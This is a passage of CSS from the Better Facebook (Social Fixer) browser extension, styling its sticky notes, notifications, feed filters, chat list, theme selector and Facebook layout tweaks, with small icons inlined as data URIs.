.bfb_sticky_note_close {float:right;}\n	.bfb_sticky_note_left .bfb_sticky_note_close {float:right;}\n	\n	div.bfb_sticky_note_close:hover {\n		background-image:url("data:image/gif,GIF89a%07%00%07%00%91%00%00%00%00%00%FF%FF%FF%FF%FF%FF%00%00%00!%F9%04%01%00%00%02%00%2C%00%00%00%00%07%00%07%00%00%02%0C%04%84%A6%B2j%C8%5Er%F1%B83%0B%00%3B");\n		border:1px solid black;\n	}\n	\n	#bfb_quickmessages { position:fixed; top:0px; right:0px; width:400px; z-index:99999; }\n	.bfb_quickmessage { background-color:#FFF1A8; color:black; border:1px solid #ccc; padding:5px; font-size:13px; -moz-border-radius:4px; -webkit-border-radius:4px; border-radius:4px; }\n\n	/* Character counter */\n	.bfb_char_count { width:30px;height:12px;font-size:10px;background-color:#ccc;color:#000;float:right; margin-top:-8px;margin-right:-5px; text-align:center; }\n	.bfb_char_count_warning { color:red; font-weight:bold; }\n	.mentionsTextarea + .bfb_char_count { margin-top:-12px; position:relative; top:5px; }\n\n	/* Pagelet styles */\n	.pagelet_title { float:left; margin-right:5px; }\n	.better_facebook_sidebar_section { width:244px !important; }\n	.better_facebook_sidebar_section .mbm { margin-bottom:0px; }\n\n	.uiSideNav .item.noimg { padding-left: 0px !important; }\n	.uiHeaderNav { margin-top:2px !important; padding-top:2px !important;}\n	.uiHeaderNav h4 { padding-bottom:2px !important; }\n	ul.bfb_uiSideNav { border:1px solid #ccc; margin:6px 0px; padding:1px 0px; clear:both; }\n	ul.bfb_uiSideNav li { width:auto; white-space:nowrap; }\n	.bfb_network { padding: 1px 0px 1px 2px !important; left:0px !important; cursor:pointer; }\n	.bfb_network .bfb_network_users a { font-weight:bold; padding-left:10px; }\n	.bfb_network .bfb_network_users { background-color:#F7F7F7; }\n	.bfb_friend_activity_img { float:left; margin-right:5px; clear:both; }\n\n	.bfb_clear { clear:both; }\n	.bfb_alt { background-color:#eee; }\n	.bfb_sidebar_header_link { margin-left:6px; }\n	.bfb_sidebar_close { border:1px solid transparent; padding:0px 2px; }\n	.bfb_sidebar_close:hover { border:1px solid #627AAD; }\n\n	#pagelet_better_fb_stickynote_pagelet { background-color:#FDFCC3; font-family:comic sans ms; font-size:12px; margin-bottom:10px; }\n	#pagelet_better_fb_stickynote_pagelet .uiSideHeader { margin-bottom:2px; background-color:transparent; }\n	#pagelet_better_fb_stickynote_pagelet .mbl { margin-bottom:0px; }\n\n	/* Collapsable right pagelets */\n	#rightCol .bfb_pagelet_closed * { margin-bottom:0; padding-bottom:0; margin-top:0; }\n	#rightCol .bfb_pagelet_closed .phs, #rightCol .bfb_pagelet_closed .ego_unit_container, .bfb_pagelet_closed .uiFacepile { display:none; }\n	#rightCol .bfb_sidebar_header_expand { font-size:10px; color:#aaa; cursor:pointer; }\n	#rightCol .bfb_pagelet_closed .bfb_sidebar_header_expand { display:inline !important; }\n\n	#rightCol .bfb_pagelet_closed .uiHeader { border-bottom: 1px solid #CCCCCC; margin-bottom:2px; }\n	#rightCol .bfb_pagelet_closed .uiHeader .uiHeaderActions { display:none; }\n	#rightCol .uiHeaderTitle { cursor:pointer; }\n	#rightCol .bfb_pagelet_closed h4, #rightCol .bfb_pagelet_closed h3 { color:#ccc; }\n	#rightCol .bfb_pagelet_closed.jewelFlyout > ul, #rightCol .bfb_pagelet_closed.jewelFlyout > .jewelFooter { display:none; }\n\n	/* Notifications */\n	\n	.bfb_notif_preview { max-height:500px; max-width:500px; overflow:auto; position:absolute; z-index:9999; border:1px solid black; padding:2px; background-color:white; -moz-border-radius:5px; -webkit-border-radius:5px; border-radius:5px; -moz-box-shadow:5px 5px 5px #999; -webkit-box-shadow:5px 5px 5px #999; }\n	.bfb_notif_preview .uiUfiAddComment { display:none; }\n	.bfb_notif_preview .hideButton { display:none; }\n	.bfb_notif_preview_message { color:#aaa; background-color:#ffffe1; font-size:10px; padding:1px; }\n	.bfb_notif_preview .uiStreamMessage { font-weight:normal !important; }\n\n	/* Debug */\n	div.bfb_debug{ display:none; border:1px solid #ccc; background-color:#eee;color:#666; text-align:left; padding:3px 0px 3px 20px; clear:both; overflow:auto; max-height:250px; background-image: url("data:image/gif,GIF89a%10%00%10%00%E6%7F%00%B7%8A%2BrV%1A666%9B%9B%9B%B1%86)%F5%BCB%D6%A33%CE%9D1qqq7)%0C%FF%C6%3F)%1E%09%FD%C0%3C%F5%BA%3A%DC%B2V%03%03%02%1C%1C%1C%1C%15%07%09%09%09III%0E%0E%0D%11%11%11%12%0E%032%26%0B%FF%C2%3C%FC%BF%3C%FF%C3%3D%FF%C4%3D%F9%BD%3A%FF%C2%3D%FB%BE%3B%FC%BF%3BWWW%E5%E5%E5%F1%B79%86%86%86%FA%FA%FA%95%95%95%FF%CDR%FB%BF%3C*\'%20%FF%C1%3BG%3E(%FF%C6A%E4%E4%E4%9Dw%24OOO%E2%AB4%FF%D2c%F8%C2O%CF%AAY%E9%B17%FB%BF%3B%F2%B89%17%17%17%60%60%60%B8%97O%FF%C8%40%FF%C9C%F8%BC%3AK%3D%1E%F3%C1X%84n%3F%FB%BE%3A%B7%B7%B7%C7%A1MJJJ%AB%8FRhhhbJ%16%E9%B6F%A5%A5%A5%FA%C8%5B%CC%9B%2F%93w8%E1%E1%E1%B3%8B4%B1%B1%B1%7B%5D%1C%80f-%A8%A8%A8%FA%C3E%8Dk!%2C!%0A6*%10%06%07%0A%0A%08%02%FE%C2%3C%AE%AE%AE%BC%8E%2C%D5%A6C%FF%C6%3D%FF%C3%3F%C6%96%2F%3B%3B%3B%EF%B58%DF%DF%DFggg%BE%99J%E7%AE6yb4%FF%CBA%98%98%98%C1%93-%7B%7B%7B%FF%C3961(%AA%83%2F%AE%85%2C%82k%3A5%2F%24%FA%BE%3B%FB%BE9%B5%B5%B5%FD%BF9222%DC%ABA%FE%C1%3C%CF%9E1%FF%C4BC%3A%24%22%22%22%96%96%96%17%16%11%A3%7C\'%F9%BD%3B%00%00%00%FF%FF%FF!%F9%04%01%00%00%7F%00%2C%00%00%00%00%10%00%10%00%00%07%DE%80%7F%82%83s%14%15%5E%83%89%83%23~U*%3C%0F~%8A%89~n81%05%04%09~%03%93~j%0E90%26%5B%07%9B%8A%126AiHCk%0D%18g%16%10%83D%0F%3E%2BW%0E%0F%0F%5D%1A%0CR~%08%82%14(Fr%5C2~~%00%1A\'%22%09%15%82~m%0A%1C%1D%BB%0F%07%1Do%18-%0F%7Fy%7BZ)%7D4%05T%0B_%19%7D%193%0B%02%12xQ%3F%7D%1CwbL%0C%7D%FC%0A%01%12%12%C8%E8%E0%D0%07N%0F%25ljx%E0%A7%81%00%05%09O%CA%2C%C4%40%C7O%02%11%EC%18%7C%00%B0G%C2%02%03%1F6l%D8%C1\'K%86%3A%1D%1A%18%08%F0%00%81%1F%0BE%F8%24y%81a%C3%18%3B%04%9C%5Cx%00BP%BC%97%11%A6%5CX%10%C1%8A%1FZ%8A%D0%FCq1a%C2%1F%10a%12%05%02%00%3B"); background-repeat:no-repeat; background-position:left top; }\n	div.bfb_debug pre { font-size:9px; }\n	div.debug_small { display:none; border:1px solid #ccc; clear:both; background-color:#eee !important; }\n	div.debug_small, div.debug_small * { color:#ccc !important; text-align:left; padding:0px; }\n	.debug_window { position:absolute; top:45px; left:1px; border:1px solid black; width:350px; max-height:800px; overflow:auto; padding:3px; }\n	body.debug .bfb_debug, body.debug .debug_small, .post_debug .bfb_debug { display:block !important; }\n	body.debug .bfb_duplicate { display:block; background-color:yellow; }\n\n	/* RPC */\n	.bfb_rpc_iframe { position:absolute; visibility:hidden; top:-500px; left:-500px; width:250px; height:200px; }\n\n	/* Trace, Debug */\n	#better_fb_debug_console { max-height:500px; overflow:auto; max-width:450px; }\n	#bfb_status { font-size:9px; font-family:arial; color:#999; vertical-align:bottom; }\n	#bfb_status_older_posts_cb { margin:0px;padding:0px;height:13px;width:13px;margin-right:2px;position:relative;top:2px;}\n	#bfb_status_filters_cb { margin:0px;padding:0px;height:13px;width:13px;margin-right:2px;position:relative;top:2px;}\n	#bfb_status .bfb_status_separator { padding:0 2px; font-weight:bold; color:#696969; }\n	#bfb_trace_window { position:fixed; top:5px; left:5px; border:4px solid #627AAD; background-color:white; padding:3px; z-index:1000; -moz-border-radius:10px; -webkit-border-radius:10px; border-radius:10px; -moz-box-shadow:5px 5px 5px #ccc; -webkit-box-shadow:5px 5px 5px #ccc;}\n	#bfb_trace_window tr:nth-child(even) { background-color:#eeeeee; }\n	#bfb_trace_window_body { max-height:300px; white-space:nowrap; overflow:auto; }\n	#bfb_trace_window_call_stack { border:1px solid #ccc; white-space:nowrap; overflow:auto; font-family:courier new; }\n	#bfb_trace_window .bfb_trace_inserted { color:#67A54B; }\n	#bfb_trace_window .bfb_trace_message { color:#922500; }\n	#bfb_trace_window_header { background-color:#627AAD; color:white; font-weight:bold; }\n\n	/* Themes */\n	.bfb_theme_extra_div { display:none; }\n\n	/* Update styles */\n	#pagelet_bfb_update_pagelet .phs { padding:0 !important; }\n	#bfb_update_pagelet { padding:5px; background-color:#FDFCC3; border: 1px solid #aaa !important; margin:0; -moz-border-radius:15px !important; }\n\n	#install_button { float:right; background:url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%01%08%00%00%01%05%08%03%00%00%00(%B6%89%13%00%00%00%01sRGB%00%AE%CE%1C%E9%00%00%00%C0PLTE%CF%EF%A5%AD%DAc%F5%FB%FE%7F%C3*%B2%E0x%86%C66%C8%EB%9A%F1%F9%FD%A0%D5S%AC%E2Y%C2%E8%91%8F%CB0%FD%FE%FF%96%CEF%EE%F9%FD%F9%FD%FF%E0%F6%C1%D5%F4%B0%DD%F5%BB%D8%DC%DF%E8%F8%D1%B0%DDm%B7%E2%84%2CB%20%A5%D8%5B%9C%D2%5C%96%CFS%AB%DBr%8E%CAC%F4%F4%F4%D5%F0%AF%A4%D7h%B8%C4%AA%BD%E5%8A%DA%F2%B6%ED%ED%ED%E7%F3%D9%F5%F8%F4%A0%A9%96%C8%DC%B0%ED%F8%FDe%7B%86%DC%EF%C6%C8%CB%CB%F8%F8%F8%F0%FA%E6%F9%FE%F3%BA%E3%7F%8E%B7W%FC%FC%FC%FD%FD%FC%E5%E8%E9%A9%C2%CC%F9%FC%F2%D2%40%1E%B7%E7n%B1%CE%88%E4%F7%CA%EB%CF%BB%9D%C0i%EA%F2%F5%81%B0E%E4%E4%E4%FF%FF%FFp%DA1%B2%00%00%00%01bKGD%00%88%05%1DH%00%00%00%09pHYs%00%00%0B%13%00%00%0B%13%01%00%9A%9C%18%00%00%00%07tIME%07%D9%04%04%1181%D8%A2%A3V%00%00%05%D5IDATx%DA%ED%91%EDj%E3%3A%10%86%C7%10L%E8R(%E1h%D9_%82%E8%06%FC%BB%F7%7Fc\'%965%D2H%B2%1D%A7%C9na%F7y%95%DA%D2%7C%BC%1A%3F%95%0B%8A%12%10%24%10%E1%A6KZ%FA%AA%B7f5%D96%9FSk%05%C6T%C3%7D%B26%EF%9CKg%E5%12%FA%0Br%BE%F5j%AE%CE%B1%08bC%97%F0%0FI%82o%22%FE%ABV%FE%C1~%7F%A4%DC%7Fq%2C%FFh%F8%06%A2%D1-%1A%9FU%C8%A6%DA%B2%A0%E1%DC%17%9A%AE*%AC%B1%D0%DD%5B%E2%DDP%F3%259%1C%F4%CA%10V%3A%C2%FA%D7%84v%AC%E4%A9g%F1%CF%E8%B9%EEWJ%5Ee%20qw%7B%CE%9Aw11%3F%F3I%C44%89m%AD*%B4Lrs2%F7%D9QRR%EA%F1%AB%DB%7C%E3%95w%C9%D3L%9DG%90%7C%81%2C%97.%8E%E2%CD%24%3A%BE%E4~%BDNj%25%97dd7%A2%B5%B6I%BD%D2g%EB%18%B6(gu\'u%A2z%B6%03ys%AB%3E%7D%1D%DA%9E%DE%DAZ%7F%D3%EEm%00%CD%1A%C7Qn%2B%FE%E6%C3%18%03c%3C%DD%96%2C%AFX%B4%FC%96t%8A%8E%A92%7Bh%26-mVw%D1%F6%14%C9%96%22%A6z%CC%C6%92%1A%D2%24y%90%D1%D8%D8%EE%25%249%A2S%A6%B3%994%7D%7B%BE%A6%D8%17%89%19e%1C%CD%17VU%99E%DD%3A%B6\'sCU-%05%FCX%FE%0F%E6%12%0Bn%5C%BF%C3%20%C93V%26b%7Dd%7D%CE%FE%2B6%EF%5B%3D%7FM%BF%D7%E5%89%99_3%D8_%20y%DB%D2%F8%F6%A0%1Enx%DCc%FCJ%F6%D8%5C%19%C4%F5%E9%8F%B8%BE%00%C4%1D%93%EBn%E2%FA%CC%5CrEQ%BB%20~~%C3%40%3F%BF%0B%C4%84%A2%00%A1%20N%A7%D3%14%7FY%93%BE%A6*0%9D%EA%B2%FAPNux-%F0%88%3A%DB%A9NM%07%1C%A6%23%A3%C8%91i%DC%5E%C6U5%CE%94%BB%B4k%DA%9D%B3%BE%D6!%EF%DD%EA%08n%7D%AA%BE%C5%ADM%EE%F6%3FE%1C%8A%02%84%82%18%A2%5C%FA%BB%3D%97%97%06%87r%AC%F7%A6%CB%99Di_%92m%CB%A6%99%BB%9Fvnm%A8%E1%E8%0D%C3n%A7%0Ch%01%F1%AB%D5%10%FF%86%F8%5E%1E%25~%7B%0Em%F5%60BC%E7%D4%05%AB%C0%D0%DD%B0%EE%D5Y%FCZ%2F%1D%EA%7D%DF2l%5E%25%BFP%14%20%14%C4%19E%01BA%BC%BF%9F%DF%DF%E3%A3%BC%CF%D5Y%F7e%7Bn%EB%B4%DA%D6%9A%0A%8DU7%95%E7%D9%B4u%96%E7%EE%D7%C4%FB%CAz%16%EB%DB%B4%9B)%DF%E5%1DE%01%02%10%80%D8%00%F1%C3%AC%EA%F0o-%F9%81%A2%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%08%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%81%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%88o%07%F1%F9%1Fk%5E%F2%89%A2%00%01%08%40l%81%F8%88K%DF%F5%DE%04V%E3%E6g%83%1FU%BE_%9B%C9~%FBi%2F%5E%B9%B9%19%AC%9Bf%C5%3D7%D8%94%7C%A0(%40(%88%0B%8AZ%03%11%9E1%0C%7F%A8%E7%E5%20%82%D1%A5y%DF%D1e%F7%A8%C1%CBC%26wK.%87%8B.%0F%5D%25%AB%05GH%F8%F0%15%5D%EEe%0F%FD%13%FC%8B%A6%BAX%10%3Ex%EFCz%CDk%D9x%B5%8D%81e%E7u%9F%96%CF\'%D3%1DB%F0uU%A9%0B%C9%25_%94%7C%B5%B0%B2N%1D%3E%DF%5Br%3A%956%87%3C%AD%B6%E4%A1%F2%5Bg%F4%EA%91~%C9%40%CA%0D%CBuY%CD%3E%CD%96%8E%A62%D8%CAP%22%C1%EC%82%19%A7%B9%A6%EE%2F%16%F5%00MM%5B%1D%B6%EA4%1D%F6%BE*J%3C%CA%20D%2C%92%DBI%D23%26%7D%CAJ%8C%89%E6%E7%12%F3NU%8BUt%94%AA%DB8%E4J%C9W%F9%25%97%B6%E2%CD%2B%5D.y%0A_%FD%E5%D9%CA%F7%E4%9F%D7i%AC%85~%A4%247%C9%D7!%84%D64%CA8%DE%9EQR%9E%A2%A7%25%2BUZR%87V%A4*)%FD%BA%1352%B9%3AQ%EA%25%DB%89u%5D%AE%93bY%0Dkk%CD%CEN6v%AD6(%5D%B7%FD%02%13%912x%9D3%C8%AAo%EF\'%E8%03%2B%5E%9B%92q%F5%DF%D3%BBK%CF%A6%9DJ%B6%AF%3E%3E%D0_.%19%DF%BAU%BF%B6%B2%1B%E9%DD%DE%03%25%87%9B%C7%83%A5%3B7%DA%CF%907%14%F5%7BA%5C_%DFr%7D%E9m%06%C4%15E%01%22%83%98z%5D%CDs%239%ED%26%AF%9B%E1%EB%A6%D7%F5%80%FD%D6%2Ce%E0%BB%FE6h%D32!%40l%818%BD%D4%F9t%3Cw%DA%AE%3B%FD%11%0A%B7%5B%E4%B4%A6%E9%B4%AF%E9%40Mk%B6_%3FM%0F%8E%F0%95%91%F7%A6%93%13%8A%12W%1D%EBSut%F6%ECZ%9F%18p%EE%E4%EA%BA%0Dc%B7%3FT%B2p%E5%E8%1E%E8ng%BD%F3%05%C9%5D%1C%8A%02%04%20%1A%10%C3%E0%E6%9F%8B%AF%F8%9C%F7%26V-%1B%2B%E16%97%3C%A3%CDF%8B%1E%3B%D7l9%D4%05z%CB%B6I%BA%CA%99%8Afj%F3nKf%10h%16%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%01%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%10%20%00%01%08%40%00%02%10%80%00%04%20%00%01%08%40%00%02%10%80%00%04%20%00%F1%DD%FA%1F5L%D8%F4.%80%00u%00%00%00%00IEND%AEB%60%82") no-repeat scroll right -130px #BAE37F; -moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;border:1px solid #888888;color:#000044;display:block;font-size:1.5em;font-weight:bold;padding:2px 16px;text-align:center;text-decoration:none; }\n	#install_button:hover { background-position:right 0;background-color:transparent;color:#0088FF; }\n\n	/* Feed Filter criteria */\n	.bfb_filter_list td { vertical-align:top; }\n	.bfb_filter_list td:last-child { vertical-align:middle; }\n	#bfb_filter_list tr:first-child .bfb_up, #bfb_filter_list tr:last-child .bfb_down { display:none; }\n	#bfb_filter_list tr:nth-child(2n) { background-color:#ddd; }\n	.bfb_filter_play { display:none; }\n	.bfb_filter_disabled { opacity:.4; }\n	.bfb_filter_disabled .bfb_filter_play { display:block; opacity:1.0 !important; }\n	.bfb_filter_disabled .bfb_filter_pause { display:none; }\n\n	/* Chat */\n	.bfb_chat_name { font-weight:bold; opacity:1; }\n	.bfb_chat_ordered_list { overflow:auto; }\n	.bfb_chat_ordered_list .item .name { line-height:28px !important;overflow:hidden !important;text-overflow:ellipsis;white-space:nowrap;max-width:none !important;float:none !important; }\n	#pagelet_dock .bfb_chat_ordered_list .item .name { max-width:100px !important; }\n\n\n	/* New window icon */\n	.commentList a.UIImageBlock_Content { padding-left:24px; background:transparent url("data:image/gif,GIF89a%0D%00%0D%00%A2%00%00%FF%FF%FF%EF%EF%EF%EB%EB%EB%CA%CA%CA%BE%BE%BE%9A%9A%9Aeee%00%00%00!%F9%04%01%07%00%03%00%2C%00%00%00%00%0D%00%0D%00%00%0368%3AT%FE%85%ACQ%02%B87%94Y%AE%F9%06%B0-%1D%F6%89%CDc%02%A1c%89%5E%EC%60%5D%88%89%A5%F8b%C2%7C%A5%90H%EE6R%0Ci%9C%DD%A57%01B%24%8B%04%00%3B") no-repeat 6px center; }\n\n	/* Image preview on hover */\n	.bfb_image_preview { display:inline; position:fixed; top:5px; right:10px; z-index:9999999; border:2px solid #ccc; -moz-border-radius:5px; -webkit-border-radius:5px; border-radius:5px; padding:5px; min-height:50px; min-width: 50px; background-color:white; -moz-box-shadow:5px 5px 5px #333; -webkit-box-shadow:5px 5px 5px #333;}\n	.bfb_image_preview[position=topleft] { top:5px; left:5px; right:auto; bottom:auto; }\n	.bfb_image_preview[position=bottomleft] { bottom:10px; left:5px; top:auto; right:auto; }\n	.bfb_image_preview[position=bottomright] { bottom:10px; right:10px; top:auto; left:auto; }\n	.bfb_image_preview_msg { font-size:16px; font-weight:bold; margin:10px; }\n	.bfb_image_preview_footnote { font-size:10px; color:#888; font-family:arial; }\n	.bfb_image_preview_caption { border:1px solid #ccc; padding:1px; background-color:white; font-size:10px; display:inline; }\n\n	/* Friend Tracker */\n	.bfb_friend_tracker_unfriended { color:red; }\n	.bfb_friend_tracker_friended { color:green; }\n	\n	/* Unspam */\n	.sfx_unspammed { border-left:2px solid green !important; }\n\n	/* Social Fixer News list */\n	html.highlight_sfx_news #navItem_fl_10150970104052276 .uiSideNavCount { background-color:red !important; color:white !important; }\n	\n	/* Theme Selector */\n	table.sfx_theme_selector {\n		background-color:white;\n	}\n	table.sfx_theme_selector .loading {\n		display:none;\n		position:absolute;\n		height:225px;\n		line-height:225px;\n		background-color:white;\n		opacity:.9;\n		text-align:center;\n		vertical-align:center;\n	}\n	table.sfx_theme_selector .theme_loading .loading {\n		display:block;\n	}\n	table.sfx_theme_selector .theme, table.sfx_theme_selector .more {\n		border:1px solid #666;\n		height:225px;\n		cursor:pointer;\n		text-align:center;\n		-moz-box-shadow:5px 5px 5px #999; \n		-webkit-box-shadow:5px 5px 5px #999; \n	}\n	table.sfx_theme_selector .theme_selected {\n		-moz-box-shadow:5px 5px 5px #3B5998; \n		-webkit-box-shadow:5px 5px 5px #3B5998; \n		border:2px dashed #3B5998;\n		font-weight:bold;\n	}\n	table.sfx_theme_selector .theme_screenshot {\n		border:1px solid #ccc;\n		margin:5px;\n	}\n	table.sfx_theme_selector, table.sfx_theme_selector td {\n		padding:0; \n		margin:0; \n		border:none; \n	}\n	table.sfx_theme_selector td { padding-right:20px; }\n	\n	/* Conditional Rules */\n	html.hide_post_actions_until_hover .bfb_post_action_container { display:none; }\n\n	html.hide_hovercard .HovercardOverlay { display:none !important; }\n\n	html.expand_nav_messages2 #navigation_item_messages ul, \n	html.expand_nav_messages2 #navItem_messages ul,\n	html.expand_nav_messages2 #navItem_inbox ul,\n	html.expand_nav_messages2 #sideNav .key-inbox ul,\n	html.expand_nav_messages2 #sideNav #navItem_app_217974574879787 > ul\n		{ display:block !important; }\n\n	html.expand_left_nav #sideNav .belowThreshold { display:block !important; }\n	html.expand_left_nav #pagelet_bookmark_nav .moreSectionsLink { display:none !important; }\n	.navHeader .bookmarksNavSeeAll { margin-right:7px !important; }\n	\n	html.left_align .fbx #globalContainer,\n	html.left_align #blueBar #pageHead\n		{ position:absolute !important; left:0 !important; margin:0px !important; }\n\n	html.static_left_col body.home #leftCol { position:fixed !important; z-index:15; padding-top:41px; }\n	html.static_left_col #leftCol {z-index:4 !important;}\n\n	html.hide_update_email #megaphone_story_44, html.hide_update_email #email_bounce_banner { display:none !important; }\n\n	html.hide_notification_pictures #fbNotificationsList .notif_block img { display:none; }\n	html.hide_notification_pictures #fbNotificationsList > li {  }\n	html.hide_notification_pictures #fbNotificationsList .info .metadata > i { display:none; }\n	html.hide_notification_pictures #fbNotificationsList .notif_block * {max-width:none !important; }\n	\n	html.pin_notifications_right_panel #fbNotificationsFlyout .blueName { color:#3B5998 !important; }\n	html.pin_notifications_right_panel #rightCol #fbNotificationsFlyout {display:block !important; left:0 !important; position:static !important; top:0 !important; width:auto !important; }\n	html.pin_notifications_right_panel #rightCol #fbNotificationsFlyout, \n		html.pin_notifications #fbNotificationsFlyout \n			{ border:1px solid #ccc !important; margin-bottom:10px !important; border-bottom:1px solid #3B5998 !important; }\n	html.pin_notifications_right_panel #rightCol .notification { border-bottom:1px solid #ddd; }\n	html.pin_notifications_right_panel #fbNotificationsFlyout .uiImageBlockContent { overflow:visible !important; }\n	html.pin_notifications_right_panel #fbNotificationsFlyout .uiScrollableAreaBody, \n		html.pin_notifications_right_panel #fbNotificationsFlyout .uiScrollableArea,\n		html.pin_notifications_right_panel #fbNotificationsFlyout .uiScrollableAreaWrap\n			{ width:100% !important; }\n	html.pin_notifications_right_panel #fbNotificationsFlyout .info { max-width: 243px !important; }\n	html.pin_notifications_right_panel #fbNotificationsList { max-height:300px !important; }\n	html.pin_notifications_right_panel #fbNotificationsList .notifMainLink { color:black !important; }\n\n	#leftCol { padding-top:5px !important; }\n\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #globalContainer {left:0 !important;margin-left:0 !important; min-width: 100px !important; width: 100% !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) .left_column_container {margin-left: 0px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #profile_top_bar{margin-left: 220px !important; padding-left: 0px !important; width: inherit !important; margin-right...: 20px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) .right_column_container {margin-left: 220px !important; width: inherit !important; margin-right: 20px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #right_column {position: static; width: auto !important; float: left !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #pagelet_ads{position: absolute !important; right: 0px;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #tab_canvas{width: 100% !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #blueBar #pageHead {left:0 !important;margin-left:0 !important;  width: 100% !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #headNav {width: auto !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #profile_pager_container {margin-right: 70px;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #headerArea {width: 100% !important; margin-left: 0px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #pagelet_header {margin-left: 0px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #contentArea {width: 100% !important; padding-left: 0px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #rightCol {position: absolute !important; width: 250px !important; padding-right: 0px !important; right: 10px !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #contentCol {width: auto !important; margin-left: 0px !important; padding-left: 200px !important; padding-right: 280px;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #contentCol {padding-left: 200px;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) .ego_page #contentCol,\n		html.stretch_wide body:not(.timelineLayout):not(.canvas) .home #contentCol \n			{padding-left: 20px;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) #pagelet_byline {width: 100% !important;}\n	html.stretch_wide body:not(.timelineLayout):not(.canvas) .uiUfi {display: inline !important; width: auto !important;}\n	html.stretch_wide.profile_two_columns body:not(.timelineLayout):not(.canvas) .right_column { padding-right:180px; }\n	/* Fix for sidebar pushing content off the left side */\n	html.stretch_wide.sidebarMode body:not(.timelineLayout):not(.canvas) #globalContainer { position:static !important; left:0px !important; }\n	/* Fix for menu options hiding under right sidebar */\n	html.stretch_wide.sidebarMode body:not(.timelineLayout):not(.canvas) #pageNav { margin-right:205px !important; }\n	html.stretch_wide.sidebarMode body:not(.timelineLayout):not(.canvas) #rightCol { right:210px !important; }\n	html.stretch_wide.sidebarMode body:not(.timelineLayout):not(.canvas) #contentCol { padding-right:490px !important; }\n	html.stretch_wide.widePage body:not(.timelineLayout):not(.canvas) #globalContainer { padding-right:0px !important; }\n	html.stretch_wide .app_center div#leftCol.fixed[style] { left: 0 !important; }\n	\n	html.fix_comments .sendOnEnterTip, \n	html.fix_comments .commentUndoTip, \n	html.fix_comments .child_is_active .sendOnEnterTip, \n	html.fix_comments .child_is_active .commentUndoTip \n		{display:none !important;} \n	#facebook.fix_comments .child_is_active .hidden_elem.commentBtn,\n		html.fix_comments #fbPhotoSnowliftFeedbackInput .hidden_elem.commentBtn\n			{display:block !important;}\n\n	html.fix_comment_cursor .uiUfi:not(.fbPhotosSnowliftUfi) .uiUfiAddComment .UIImageBlock_Content.commentArea {display:block !important;width:auto !important;margin-left:40px;}\n	html.fix_comment_wrap .DOMControl_shadow:after { content:\'XXX\'; }\n\n	/* Right Col */\n	html.hide_happening_now #pagelet_rhc_ticker, html.hide_happening_now #pagelet_ticker { display:none !important; }\n	html.unlock_right_col .fixedRightCol .home_right_column {position: static !important;}\n	\n	/* Force the ticker to not be static */\n	html.ticker_scroll .rightColumnWrapper.fixed_elem { position:static !important; } \n	\n	/* Chat */\n	html.chat_hide #fbDockChatBuddylistNub { display:none !important; }\n	\n	.fbChatOrderedList.compact img.pic { display:none !important; }\n	.fbChatOrderedList.compact .name { line-height:normal !important; }\n	.fbChatOrderedList.compact .item .icons { height:auto !important; line-height:normal !important; }\n\n	/* Hide our list when the search is active */\n	.fbChatOrderedList ~ .fbChatTypeaheadView { display:none; }\n	.fbChatOrderedList.hidden_elem ~ .fbChatTypeaheadView { display:block; }\n	.fbChatOrderedList.hidden_elem ~ .fbChatOrderedList { display:none !important; }\n	\n	/* Chronological Order, Top Stories */\n	html.chronological .uiStreamHeaderTall { display:none; }\n	\n	/* Lock the header in place */\n	html.lock_header.tinyViewport .slim #blueBar.fixed_elem { position: fixed !important; }\n\n	/* Timeline! */\n	html.timeline_hide_cover_photo body.timelineLayout .photoContainer .profilePicThumb { top:18px !important; }\n	html.timeline_hide_cover_photo body.timelineLayout #fbProfileCover { margin-top:75px !important; }\n	html.timeline_hide_cover_photo body.timelineLayout #fbProfileCover .coverImage { display:none !important; }\n	\n	html.timeline_hide_friends_box body.timelineLayout #pagelet_timeline_ego_box,\n		html.timeline_hide_friends_box body.timelineLayout #pagelet_escape_hatch_people,\n		html.timeline_hide_friends_box body.timelineLayout #tl_unit_134443406686720_recent\n			{ display:none !important; }\n	\n	html.timeline_hide_maps body.timelineLayout .fbTimelineFlyoutMap { display:none !important; }\n	\n	html.timeline_single_column body.timelineLayout #better_fb_cp { width:600px; }\n	\n	html.timeline_single_column body.timelineLayout .fbTimelineUnit { float:none !important; z-index:inherit !important; }\n	html.timeline_single_column body.timelineLayout .fbTimelineSpine, \n		html.timeline_single_column body.timelineLayout .spinePointer \n			{ display:none !important; }\n	html.timeline_single_column body.timelineLayout ol.fbTimelineCapsule ,\n		html.timeline_single_column 